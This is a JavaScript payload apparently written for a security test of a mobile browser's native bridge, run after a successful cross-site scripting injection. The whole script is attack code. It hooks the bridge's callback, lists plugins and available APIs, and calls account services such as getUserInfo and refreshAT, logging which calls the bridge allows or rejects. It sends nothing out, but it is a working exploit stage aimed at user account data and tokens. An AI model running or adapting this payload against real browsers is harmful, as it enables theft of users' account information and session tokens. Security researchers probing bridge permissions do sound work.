try {
  document.body.innerHTML = '<div id="atk" style="font-size:12px;color:red;padding:8px;word-break:break-all;line-height:1.6;"></div>';
  var d = document.getElementById('atk');
  function log(msg) {
    console.log('CLOUDXLAB_ATTACK: ' + msg);
    if (d) { d.innerHTML += msg + '<br>'; }
  }
  log('xss_verify result=success');
  var bn = window._hwbrNative;
  if (!bn) {
    log('no _hwbrNative bridge');
  } else {
    log('bridge found, methods=' + Object.getOwnPropertyNames(bn).join(','));
    var callbacks = {};
    var cbSeq = Math.floor(Math.random() * 100000);
    log('window.hwbr exists=' + (!!window.hwbr));
    if (window.hwbr) {
      log('hwbr methods=' + Object.getOwnPropertyNames(window.hwbr).join(','));
    }
    window.hwbr = window.hwbr || {};
    window.hwbr.callbackFromNative = function(cbId, ok, status, data, keep) {
      log('CALLBACK cbId=' + cbId + ' ok=' + ok + ' status=' + status + ' data=' + JSON.stringify(data) + ' keep=' + keep);
      var cb = callbacks[cbId];
      if (cb) {
        if (ok && status === 1) { cb.s && cb.s(data); }
        else { cb.f && cb.f(data, status); }
        if (!keep) { delete callbacks[cbId]; }
      }
    };
    log('callbackFromNative installed');
    function async(service, action, args, onOk, onFail) {
      try {
        var cbId = 'a' + (cbSeq++);
        if (onOk || onFail) callbacks[cbId] = { s: onOk, f: onFail };
        var ret = bn.invoke(service, action, cbId, JSON.stringify(args || []), -1);
        log('ASYNC ' + service + '.' + action + ' cbId=' + cbId + ' ret=' + (ret ? ret.substring(0, 80) : 'empty'));
      } catch(e) {
        log('ASYNC ' + service + '.' + action + ' ERR=' + e.message);
      }
    }
    function sync(service, action, args) {
      try {
        var r = bn.invokeSync(service, action, JSON.stringify(args || []));
        log('SYNC ' + service + '.' + action + ' = ' + r);
        return r;
      } catch(e) {
        log('SYNC ' + service + '.' + action + ' ERR=' + e.message);
        return null;
      }
    }
    if (window.hwbr.invokePromise) {
      log('using hwbr.invokePromise');
      function invokePromise(service, action, args) {
        window.hwbr.invokePromise(service, action, args)
          .then(function(r) { log('PROMISE ' + service + '.' + action + ' OK=' + JSON.stringify(r)); })
          .catch(function(e) { log('PROMISE ' + service + '.' + action + ' ERR=' + JSON.stringify(e)); });
      }
    }
    log('=== app service (strategy=always true, SHOULD PASS) ===');
    async('app', 'getPluginList', [],
      function(r) { log('getPluginList OK=' + JSON.stringify(r)); },
      function(r, s) { log('getPluginList FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    async('app', 'getPluginApiList', [['app', 'report', 'linkedLogin', 'account', 'browser', 'network']],
      function(r) {
        log('getPluginApiList OK=' + JSON.stringify(r));
        try {
          var parsed = typeof r === 'string' ? JSON.parse(r) : r;
          if (parsed && parsed.functions) {
            log('available functions: ' + parsed.functions.join(', '));
          }
        } catch(e) {}
      },
      function(r, s) { log('getPluginApiList FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    log('=== linkedLogin service (registered for HTTPS tabs) ===');
    async('linkedLogin', 'isLogin', [{ clientId: 'test_client_id' }],
      function(r) { log('linkedLogin.isLogin OK=' + JSON.stringify(r)); },
      function(r, s) { log('linkedLogin.isLogin FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    log('=== report service ===');
    async('report', 'eventReport', [{ eventName: 'action_page_translate_end', data: {} }],
      function(r) { log('report.eventReport OK=' + JSON.stringify(r)); },
      function(r, s) { log('report.eventReport FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    log('=== account service (NOT registered, expect status:8) ===');
    async('account', 'hasLogin', [],
      function(r) { log('account.hasLogin OK=' + JSON.stringify(r)); },
      function(r, s) { log('account.hasLogin FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    async('account', 'getUserInfo', [],
      function(r) { log('account.getUserInfo OK=' + JSON.stringify(r)); },
      function(r, s) { log('account.getUserInfo FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    async('account', 'refreshAT', [],
      function(r) { log('account.refreshAT OK=' + JSON.stringify(r)); },
      function(r, s) { log('account.refreshAT FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    log('=== browser service (NOT registered, expect status:8) ===');
    sync('browser', 'isIncognitoModeSync', []);
    log('=== done, waiting for callbacks ===');
  }
} catch(e) {
  document.body.innerHTML = '<div style="color:red;font-size:14px;padding:10px;">FATAL: ' + e.message + '</div>';
}
